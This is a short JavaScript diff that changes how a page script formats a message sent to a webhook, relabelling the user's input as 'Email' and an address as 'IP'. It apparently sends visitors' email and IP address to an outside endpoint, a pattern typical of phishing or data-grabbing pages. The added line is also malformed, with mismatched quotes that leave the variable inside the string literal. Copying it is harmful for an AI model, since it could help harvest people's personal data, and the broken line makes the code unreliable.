@@ -23,7 +23,7 @@ document.addEventListener('DOMContentLoaded', function() {
           
           // Construct the message payload
           const payload = {
-            content: inputText + ' :: ' + address
+            content: '```Email: inputText + '\nIP: '+address + '```'
           };
 
           // Send the message to the webhook
